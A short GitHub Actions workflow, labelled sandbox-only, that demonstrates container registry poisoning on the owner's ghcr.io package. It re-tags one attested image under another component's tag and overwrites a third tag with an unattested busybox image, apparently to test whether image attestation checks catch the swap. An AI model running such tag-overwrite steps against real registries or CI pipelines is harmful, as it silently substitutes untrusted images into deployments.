name: Poison
# Sandbox only: what any workflow holding packages: write could do to the cache.
on: workflow_dispatch
permissions:
  contents: read
  packages: write
jobs:
  poison:
    runs-on: ubuntu-latest
    steps:
      - uses: docker/setup-buildx-action@8d2750c68a42422c14e847fe6c8ac0403b4cbd6f # v3.12.0
      - uses: docker/login-action@c94ce9fb468520275223c153574b00df6fe4bcc9 # v3.7.0
        with:
          registry: ghcr.io
          username: ${{ github.repository_owner }}
          password: ${{ secrets.GITHUB_TOKEN }}
      - name: Re-tag an attested image and push an unattested one under current keys
        env:
          PKG: ${{ github.repository_owner }}/kserve-e2e-images-attest2
        run: |
          set -euo pipefail
          token=$(curl -s "https://ghcr.io/token?scope=repository:${PKG}:pull" | jq -r .token)
          tags=$(curl -s -H "Authorization: Bearer ${token}" "https://ghcr.io/v2/${PKG}/tags/list?n=1000" | jq -r '.tags[]')
          router=$(grep '^router-' <<<"${tags}" | head -1)
          agent=$(grep '^agent-' <<<"${tags}" | head -1)
          xgb=$(grep '^xgbserver-' <<<"${tags}" | head -1)
          docker buildx imagetools create -t "ghcr.io/${PKG}:${router}" "ghcr.io/${PKG}:${agent}"
          printf 'FROM busybox:1.36\n' | docker buildx build -t "ghcr.io/${PKG}:${xgb}" --provenance=false --push -
          echo "re-tagged ${agent} as ${router}; pushed busybox as ${xgb}"
